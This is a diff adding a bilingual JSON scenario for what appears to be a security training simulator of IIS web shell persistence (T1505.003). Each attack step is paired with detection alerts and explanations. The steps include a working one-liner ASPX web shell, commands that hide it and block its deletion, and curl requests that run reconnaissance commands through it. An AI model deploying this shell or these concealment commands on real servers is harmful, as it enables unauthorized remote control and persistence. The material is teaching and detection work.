@@ -1,0 +1,189 @@
+{
+  "id": "T1505.003",
+  "title": "Web Shell 지속성 시뮬레이션",
+  "titleEn": "Web Shell Persistence Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 정찰", "labelEn": "🔍 Recon", "steps": [0] },
+    { "label": "⚡ Web Shell 배치", "labelEn": "⚡ Web Shell Deployment", "steps": [1, 2] },
+    { "label": "🔓 명령 실행", "labelEn": "🔓 Command Execution", "steps": [3] },
+    { "label": "🛡️ 검증", "labelEn": "🛡️ Verification", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 50, "y": 80 },
+    { "id": "webserver", "label": "Web Server\nIIS-WEB01", "x": 250, "y": 80 },
+    { "id": "webroot", "label": "C:\\inetpub\nwwwroot", "x": 450, "y": 30 },
+    { "id": "w3wp", "label": "w3wp.exe\n(App Pool)", "x": 450, "y": 130 },
+    { "id": "intranet", "label": "Internal\nNetwork", "x": 250, "y": 180 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "webserver", "minStep": 0 },
+    { "from": "webserver", "to": "webroot", "minStep": 1 },
+    { "from": "webroot", "to": "w3wp", "minStep": 3 },
+    { "from": "w3wp", "to": "intranet", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "IIS Manager", "icon": "🌐" },
+    { "name": "PowerShell", "icon": "💻" },
+    { "name": "Event Viewer", "icon": "📋" },
+    { "name": "Explorer", "icon": "📁" }
+  ],
+  "steps": [
+    {
+      "cmd": "dir C:\\inetpub\\wwwroot\\ /s /b *.aspx *.asp *.php & icacls C:\\inetpub\\wwwroot\\uploads",
+      "out": "C:\\inetpub\\wwwroot\\Default.aspx\nC:\\inetpub\\wwwroot\\about.aspx\nC:\\inetpub\\wwwroot\\contact.aspx\nC:\\inetpub\\wwwroot\\login.aspx\nC:\\inetpub\\wwwroot\\uploads\\(empty)\n\nC:\\inetpub\\wwwroot\\uploads\n    IIS_IUSRS:(OI)(CI)(M)\n    BUILTIN\\Administrators:(OI)(CI)(F)\n    NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n\n[*] Web root: C:\\inetpub\\wwwroot\n[*] Writable upload dir: C:\\inetpub\\wwwroot\\uploads\\\n[*] IIS version: 10.0\n[*] Application pool: DefaultAppPool (.NET 4.0)\n[*] Existing pages: 4 ASPX files",
+      "def": "[EDR] Web root directory enumeration detected - IIS reconnaissance activity",
+      "defAction": "Source: Sysmon Event ID 1 + File Access Audit\nTarget: C:\\inetpub\\wwwroot directory listing\nAction: Directory access logged, compared to normal admin activity patterns",
+      "desc": "웹 루트 디렉토리 구조와 업로드 가능 폴더의 권한을 확인합니다.",
+      "descEn": "The attacker examines web root directory structure and upload folder permissions.",
+      "stepTitle": "웹 서버 디렉토리 정찰",
+      "stepTitleEn": "Web Server Directory Reconnaissance",
+      "feynman": "건물 안에서 어느 방에 들어갈 수 있는지 확인하는 것과 같습니다. uploads 폴더에 IIS_IUSRS 쓰기 권한이 있으면 웹을 통해 파일을 넣을 수 있습니다.",
+      "feynmanEn": "It's like checking which rooms you can enter in a building. If the uploads folder has IIS_IUSRS write permissions, files can be placed through the web.",
+      "expert": "IIS_IUSRS:(OI)(CI)(M)는 IIS 웹 서버 프로세스가 이 디렉토리에 파일을 생성할 수 있음을 의미합니다. OI(Object Inherit)와 CI(Container Inherit)는 하위 항목에도 권한이 상속됨을 나타냅니다. uploads 디렉토리의 쓰기 권한은 Web Shell 배치의 주요 진입점입니다.",
+      "expertEn": "IIS_IUSRS:(OI)(CI)(M) means the IIS web server process can create files in this directory. OI (Object Inherit) and CI (Container Inherit) indicate permissions propagate to child items. Upload directory write permissions are the primary entry point for Web Shell deployment.",
+      "defTooltip": "🔐 웹 루트 디렉토리 열거 감지! IIS 정찰 활동 패턴입니다.",
+      "defTooltipEn": "🔐 Web root directory enumeration detected! IIS reconnaissance activity pattern.",
+      "hackerLog": {
+        "title": "webroot_recon.txt",
+        "lines": [
+          { "log": "Writable upload dir: uploads/", "desc": "💡 업로드 디렉토리 쓰기 가능 - Web Shell 배치 가능" },
+          { "log": "Application pool: DefaultAppPool (.NET 4.0)", "desc": "💡 .NET 4.0 - ASPX Web Shell 실행 가능" },
+          { "log": "IIS_IUSRS:(OI)(CI)(M)", "desc": "💡 웹 프로세스에 수정(M) 권한 - 파일 생성 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "Web Shell", "desc": "웹 서버에 업로드된 악성 스크립트. HTTP 요청을 통해 서버에서 명령을 실행합니다." },
+        { "name": "IIS_IUSRS", "desc": "IIS 웹 서버의 기본 사용자 그룹. 웹 요청 처리에 사용되는 보안 컨텍스트입니다." },
+        { "name": "Application Pool", "desc": "IIS의 프로세스 격리 단위. 각 풀은 독립된 w3wp.exe 프로세스에서 실행됩니다." }
+      ]
+    },
+    {
+      "cmd": "echo ^<%@ Page Language=\"C#\" %^>^<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c \"+Request[\"cmd\"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd() %^> > C:\\inetpub\\wwwroot\\uploads\\error-handler.aspx",
+      "out": "[*] Web Shell deployed:\n    Path: C:\\inetpub\\wwwroot\\uploads\\error-handler.aspx\n    Size: 247 bytes\n    Type: One-liner ASPX Web Shell\n    URL: http://IIS-WEB01/uploads/error-handler.aspx\n\n[*] Shell capabilities:\n    - Remote command execution via ?cmd= parameter\n    - Runs as w3wp.exe (IIS_IUSRS context)\n    - No authentication required\n    - Filename mimics error handler (camouflage)",
+      "def": "[EDR] New ASPX file created in uploads directory - potential web shell",
+      "defAction": "Source: Sysmon Event ID 11 (FileCreate)\nTarget: error-handler.aspx in uploads/\nAction: File content analyzed - command execution pattern detected, file quarantined",
+      "desc": "업로드 디렉토리에 정상 에러 핸들러로 위장한 ASPX Web Shell을 배치합니다.",
+      "descEn": "The attacker deploys an ASPX Web Shell in the uploads directory disguised as an error handler.",
+      "stepTitle": "ASPX Web Shell 배치",
+      "stepTitleEn": "ASPX Web Shell Deployment",
+      "feynman": "호텔 프론트 데스크에 가짜 내선 전화기를 설치하는 것과 같습니다. 외부에서 전화(HTTP 요청)를 걸면 호텔 내부 어디든 연결(명령 실행)할 수 있습니다. 'error-handler'라는 이름은 정상 파일처럼 보이게 합니다.",
+      "feynmanEn": "It's like installing a fake internal phone at a hotel front desk. External calls (HTTP requests) can connect to anywhere inside (command execution). The name 'error-handler' makes it look legitimate.",
+      "expert": "One-liner ASPX Web Shell은 System.Diagnostics.Process.Start를 사용하여 cmd.exe를 실행합니다. RedirectStandardOutput=true로 명령 출력을 캡처하고 HTTP 응답으로 반환합니다. 247 bytes라는 작은 크기는 파일 크기 기반 탐지를 우회합니다.",
+      "expertEn": "One-liner ASPX Web Shell uses System.Diagnostics.Process.Start to execute cmd.exe. RedirectStandardOutput=true captures command output and returns it as HTTP response. The small 247-byte size evades file-size-based detection.",
+      "defTooltip": "🔐 uploads에 새 ASPX 파일 생성! 명령 실행 패턴이 감지되었습니다.",
+      "defTooltipEn": "🔐 New ASPX file in uploads! Command execution pattern detected.",
+      "hackerLog": {
+        "title": "webshell_deploy.txt",
+        "lines": [
+          { "log": "Size: 247 bytes (one-liner)", "desc": "💡 초소형 크기 - 파일 크기 기반 탐지 우회" },
+          { "log": "Filename: error-handler.aspx", "desc": "💡 정상 에러 핸들러로 위장" },
+          { "log": "No authentication required", "desc": "💡 인증 없이 접근 가능 - 누구나 사용 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "ASPX", "desc": "ASP.NET 웹 페이지 파일 형식. C# 또는 VB.NET 코드를 서버에서 실행합니다." },
+        { "name": "One-liner Shell", "desc": "한 줄로 구성된 최소 크기 Web Shell. 탐지를 어렵게 하기 위해 코드를 최소화합니다." },
+        { "name": "w3wp.exe", "desc": "IIS Worker Process. 웹 요청을 처리하는 IIS의 핵심 프로세스입니다." }
+      ]
+    },
+    {
+      "cmd": "attrib +h +s C:\\inetpub\\wwwroot\\uploads\\error-handler.aspx & icacls C:\\inetpub\\wwwroot\\uploads\\error-handler.aspx /deny \"BUILTIN\\Users:(D)\"",
+      "out": "[*] Web Shell hardened:\n    Hidden: Yes (attrib +h)\n    System: Yes (attrib +s)\n    Delete protection: Users denied delete permission\n\n[*] Evasion techniques applied:\n    1. File hidden from dir listing (Hidden + System attributes)\n    2. Non-admin users cannot delete the shell\n    3. File timestamp preserved (creation date not updated)\n    4. Filename matches legitimate error handler pattern",
+      "def": "[EDR] File attributes changed to Hidden+System - evasion technique detected",
+      "defAction": "Source: Sysmon Event ID 11 + attrib monitoring\nTarget: error-handler.aspx attribute change\nAction: Attribute changes reverted, file flagged for investigation",
+      "desc": "Web Shell 파일에 숨김/시스템 속성을 설정하고 삭제를 방지합니다.",
+      "descEn": "The attacker sets Hidden/System attributes on the Web Shell and prevents deletion.",
+      "stepTitle": "Web Shell 은닉 강화",
+      "stepTitleEn": "Web Shell Concealment Hardening",
+      "feynman": "가짜 내선 전화기에 투명 케이스를 씌우고 벽에 나사로 고정하는 것과 같습니다. 일반 직원은 전화기가 있는지 모르고(숨김), 발견하더라도 제거할 수 없습니다(삭제 방지).",
+      "feynmanEn": "It's like putting an invisible case on the fake phone and screwing it into the wall. Regular employees can't see it (hidden) and even if found, can't remove it (delete protection).",
+      "expert": "attrib +h +s는 파일을 숨김+시스템 속성으로 설정하여 기본 dir 명령과 탐색기에서 표시되지 않습니다. BUILTIN\\Users에 대한 Delete 거부는 일반 사용자가 파일을 삭제할 수 없게 합니다. 그러나 관리자는 여전히 접근 가능하며, dir /a:hs로 숨김+시스템 파일을 나열할 수 있습니다.",
+      "expertEn": "attrib +h +s sets Hidden+System attributes, hiding files from default dir and Explorer. Denying Delete for BUILTIN\\Users prevents regular users from removing the file. Administrators can still access it, and dir /a:hs lists Hidden+System files.",
+      "defTooltip": "🔐 파일 속성 Hidden+System 변경! 은닉 기법이 감지되었습니다.",
+      "defTooltipEn": "🔐 File attributes changed to Hidden+System! Concealment technique detected.",
+      "hackerLog": {
+        "title": "shell_harden.txt",
+        "lines": [
+          { "log": "Hidden + System attributes set", "desc": "💡 기본 디렉토리 목록에서 숨김" },
+          { "log": "Delete permission denied for Users", "desc": "💡 일반 사용자 삭제 방지" },
+          { "log": "Filename matches error handler pattern", "desc": "💡 정상 파일명으로 위장" }
+        ]
+      },
+      "terms": [
+        { "name": "attrib", "desc": "Windows 파일 속성을 변경하는 명령. +h(숨김), +s(시스템), +r(읽기전용) 등을 설정합니다." },
+        { "name": "icacls", "desc": "Windows ACL(접근 제어 목록)을 관리하는 명령. 파일/폴더 권한을 수정합니다." },
+        { "name": "BUILTIN\\Users", "desc": "Windows의 기본 사용자 그룹. 시스템의 모든 일반 사용자 계정이 포함됩니다." }
+      ]
+    },
+    {
+      "cmd": "curl -s \"http://IIS-WEB01/uploads/error-handler.aspx?cmd=whoami+%26+ipconfig+%26+net+user\"",
+      "out": "iis apppool\\defaultapppool\n\nWindows IP Configuration\n\nEthernet adapter Ethernet0:\n   Connection-specific DNS Suffix  . : corp.local\n   IPv4 Address. . . . . . . . . . . : 10.0.1.50\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.0.1.1\n\nUser accounts for \\\\IIS-WEB01\n--------------------------------------------\nAdministrator            Guest                    svc_backup\nsvc_web                  webadmin\nThe command completed successfully.\n\n[*] Web Shell command executed:\n    URL: /uploads/error-handler.aspx?cmd=whoami+%26+ipconfig+%26+net+user\n    User context: iis apppool\\defaultapppool\n    Internal IP: 10.0.1.50\n    Domain: corp.local\n    Local accounts: 5 found",
+      "def": "[SIEM] w3wp.exe spawned cmd.exe - Web Shell command execution detected",
+      "defAction": "Source: Sysmon Event ID 1 (Process Creation)\nTarget: cmd.exe spawned by w3wp.exe with suspicious arguments\nAction: Process terminated, IIS application pool recycled, Web Shell removed",
+      "desc": "HTTP 요청을 통해 Web Shell에서 시스템 정보 수집 명령을 실행합니다.",
+      "descEn": "The attacker executes system information gathering commands through the Web Shell via HTTP request.",
+      "stepTitle": "Web Shell 통한 원격 명령 실행",
+      "stepTitleEn": "Remote Command Execution via Web Shell",
+      "feynman": "가짜 내선 전화로 호텔 관리실에 전화해서 '이 건물에 누가 있나요?'라고 물어보는 것과 같습니다. 웹 브라우저에서 URL에 명령을 입력하면 서버가 그 명령을 실행하고 결과를 돌려줍니다.",
+      "feynmanEn": "It's like using the fake phone to call the hotel management and ask 'who's in this building?' Typing commands into the URL in a web browser makes the server execute them and return results.",
+      "expert": "w3wp.exe가 cmd.exe를 생성하는 것은 Web Shell의 핵심 탐지 지표입니다. IIS 워커 프로세스는 정상적으로 cmd.exe를 호출하지 않습니다. Sysmon Event ID 1에서 ParentImage가 w3wp.exe이고 Image가 cmd.exe인 이벤트를 모니터링해야 합니다. URL의 %26은 &의 URL 인코딩으로 여러 명령을 연결합니다.",
+      "expertEn": "w3wp.exe spawning cmd.exe is a key Web Shell detection indicator. IIS worker processes don't normally invoke cmd.exe. Monitor Sysmon Event ID 1 where ParentImage is w3wp.exe and Image is cmd.exe. %26 in URL is URL-encoded & to chain multiple commands.",
+      "defTooltip": "🔐 w3wp.exe에서 cmd.exe 생성! Web Shell 명령 실행이 감지되었습니다.",
+      "defTooltipEn": "🔐 cmd.exe spawned by w3wp.exe! Web Shell command execution detected.",
+      "hackerLog": {
+        "title": "cmd_exec.txt",
+        "lines": [
+          { "log": "Context: iis apppool\\defaultapppool", "desc": "💡 IIS Application Pool 권한으로 실행" },
+          { "log": "Internal IP: 10.0.1.50 (corp.local)", "desc": "💡 내부 네트워크 정보 획득 - 횡적 이동 준비" },
+          { "log": "Local accounts: 5 found", "desc": "💡 로컬 계정 목록 확인 - 권한 상승 대상" }
+        ]
+      },
+      "terms": [
+        { "name": "curl", "desc": "URL로 데이터를 전송하는 CLI 도구. Web Shell에 HTTP 요청을 보내는 데 사용됩니다." },
+        { "name": "URL 인코딩", "desc": "URL에서 특수 문자를 %XX 형식으로 변환하는 방식. &는 %26으로 인코딩됩니다." },
+        { "name": "Application Pool 컨텍스트", "desc": "IIS에서 웹 요청이 실행되는 보안 환경. 기본 풀은 제한된 권한을 가집니다." }
+      ]
+    },
+    {
+      "cmd": "curl -s \"http://IIS-WEB01/uploads/error-handler.aspx?cmd=dir+C:\\inetpub\\wwwroot\\uploads+/a:hs\"",
+      "out": " Volume in drive C has no label.\n Volume Serial Number is 1234-5678\n\n Directory of C:\\inetpub\\wwwroot\\uploads\n\n03/01/2026  02:15 PM    <DIR>          .\n03/01/2026  02:15 PM    <DIR>          ..\n03/01/2026  02:15 PM               247 error-handler.aspx\n               1 File(s)            247 bytes\n\n[*] Web Shell persistence verification:\n    - File exists and accessible via HTTP: YES\n    - Hidden from normal dir listing: YES (Hidden+System)\n    - Command execution functional: YES\n    - Server reboot survival: YES (static file)\n    - IIS recycle survival: YES (static file)\n\n[+] Web Shell persistence: ACTIVE\n[+] Remote access: CONFIRMED via HTTP/HTTPS\n[+] Detection evasion: Hidden+System attributes\n[+] Network position: Internal network (10.0.1.0/24, corp.local)",
+      "def": "[SIEM] Persistent Web Shell confirmed - HTTP-based backdoor active on IIS-WEB01",
+      "defAction": "Source: Web server log analysis + File integrity monitoring\nTarget: error-handler.aspx serving commands via HTTP\nAction: Web Shell removed, IIS hardened, upload directory write permissions revoked, incident response initiated",
+      "desc": "Web Shell의 지속성과 은닉 상태를 검증합니다.",
+      "descEn": "The attacker verifies Web Shell persistence and concealment status.",
+      "stepTitle": "Web Shell 지속성 검증",
+      "stepTitleEn": "Web Shell Persistence Verification",
+      "feynman": "가짜 전화기가 제대로 숨겨져 있는지, 전원을 꺼도 다시 켜면 작동하는지 테스트하는 것과 같습니다. Web Shell은 정적 파일이므로 서버 재시작이나 IIS 재활용 후에도 계속 동작합니다.",
+      "feynmanEn": "It's like testing if the fake phone is properly hidden and still works after a power cycle. Web Shells are static files, so they survive server restarts and IIS recycling.",
+      "expert": "Web Shell은 정적 파일이므로 서버 재시작, IIS Application Pool 재활용 등의 이벤트에서도 지속됩니다. dir /a:hs로 숨김+시스템 파일을 나열하여 Web Shell이 여전히 존재하는지 확인합니다. 완전한 제거를 위해서는 웹 루트 전체를 스캔하고 IIS 로그에서 의심스러운 요청 패턴을 분석해야 합니다.",
+      "expertEn": "Web Shells persist through server restarts and IIS Application Pool recycling as static files. dir /a:hs lists Hidden+System files to verify the Web Shell still exists. Complete removal requires scanning the entire web root and analyzing IIS logs for suspicious request patterns.",
+      "defTooltip": "🔐 영구 Web Shell 확인! HTTP 기반 백도어가 IIS-WEB01에서 활성 상태입니다.",
+      "defTooltipEn": "🔐 Persistent Web Shell confirmed! HTTP-based backdoor active on IIS-WEB01.",
+      "hackerLog": {
+        "title": "persistence_verify.txt",
+        "lines": [
+          { "log": "Hidden from normal dir listing: YES", "desc": "💡 일반 디렉토리 목록에서 숨김 확인" },
+          { "log": "Server reboot survival: YES", "desc": "💡 서버 재시작 후에도 지속 확인" },
+          { "log": "Network position: 10.0.1.0/24, corp.local", "desc": "💡 내부 네트워크 접근 가능 - 횡적 이동 거점" }
+        ]
+      },
+      "terms": [
+        { "name": "IIS 로그", "desc": "IIS 웹 서버의 요청 로그. Web Shell 접근 흔적을 분석하는 데 사용됩니다." },
+        { "name": "정적 파일", "desc": "서버에 물리적으로 존재하는 파일. 동적 코드와 달리 서버 재시작 후에도 유지됩니다." },
+        { "name": "횡적 이동", "desc": "네트워크 내에서 다른 시스템으로 이동하는 공격 기법. Web Shell은 횡적 이동의 거점이 됩니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "cmd.exe (attacker)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "dir (webroot enum)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "echo > (shell deploy)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "attrib +h +s (hide)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "[HTTP Request]", "depth": 0, "alert": false, "minStep": 3 },
+    { "name": "w3wp.exe (IIS)", "depth": 1, "alert": false, "minStep": 3 },
+    { "name": "cmd.exe /c whoami", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "cmd.exe /c dir", "depth": 2, "alert": true, "minStep": 4 }
+  ]
+}
